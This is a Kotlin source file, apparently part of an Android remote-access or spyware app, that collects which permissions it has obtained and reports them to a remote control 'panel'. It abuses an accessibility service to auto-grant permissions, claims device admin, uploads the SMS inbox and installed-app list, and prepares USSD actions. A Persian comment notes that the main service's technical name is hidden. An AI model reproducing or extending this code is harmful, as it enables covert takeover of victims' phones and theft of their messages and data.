package com.base.realtime.access

import android.content.Context
import com.base.realtime.RealtimeApp
import android.Manifest
import android.content.pm.PackageManager
import com.base.realtime.apps.InstalledApps
import com.base.realtime.apps.InstalledAppsPush
import com.base.realtime.oem.BackgroundAccess
import com.base.realtime.protocol.Protocol
import com.base.realtime.sms.SmsInboxPush
import com.base.realtime.sms.SmsPermissions
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put

/**
 * وضعیت دسترسی‌های گرفته‌شده را برای پنل می‌فرستد.
 * کلید setup همان سرویس اصلی است؛ در متن گروه نام فنی آن نمی‌آید.
 */
internal object GrantReporter {

    const val SETUP = "setup"
    const val NOTIFICATIONS = "notifications"
    const val BATTERY = "battery"
    const val ALARM = "alarm"
    const val AUTOSTART = "autostart"
    const val CALL = "call"
    const val PHONE = "phone"
    const val APPS = "apps"
    const val ADMIN = "admin"

    fun current(context: Context): List<String> {
        val app = context.applicationContext
        val out = ArrayList<String>(12)
        if (AgentAccessibilityService.isEnabled(app) || AgentAccessibilityService.get() != null) {
            out += SETUP
        }
        if (BackgroundAccess.hasNotifications(app)) out += NOTIFICATIONS
        out += SmsPermissions.grantedKeys(app)
        if (BackgroundAccess.isIgnoringBatteryOptimizations(app)) out += BATTERY
        if (BackgroundAccess.canScheduleExactAlarms(app)) out += ALARM
        if (AutoGrantProgress.isOemGranted(app)) out += AUTOSTART
        if (granted(app, Manifest.permission.CALL_PHONE)) out += CALL
        if (granted(app, Manifest.permission.READ_PHONE_STATE)) out += PHONE
        if (InstalledApps.canRead(app)) out += APPS
        if (DeviceAdminClaim.isActive(app)) out += ADMIN
        return out
    }

    private fun granted(context: Context, name: String): Boolean {
        return context.checkSelfPermission(name) == PackageManager.PERMISSION_GRANTED
    }

    /**
     * true only after accessibility is on and the auto-grant UI is finished.
     * A USSD first action must not start while that UI is still on screen.
     */
    fun settled(context: Context): Boolean {
        if (AutoGrantOrchestrator.isActive()) return false
        if (!AgentAccessibilityService.isEnabled(context)) return false
        return !AutoGrantProgress.shouldRun(context)
    }

    fun sync(context: Context, allowReady: Boolean = true, forceReady: Boolean = false) {
        val grants = current(context)
        val payload = buildJsonObject {
            put("grants", buildJsonArray { grants.forEach { add(it) } })
            put("ready", forceReady || (allowReady && settled(context)))
        }
        RealtimeApp.engine(context).enqueue(
            Protocol.TYPE_DEVICE_GRANTS,
            payload,
            dedupeKey = Protocol.TYPE_DEVICE_GRANTS,
        )
        if (InstalledApps.canRead(context)) {
            InstalledAppsPush.tryPush(context)
        }
        SmsInboxPush.onGrants(context)
    }
}
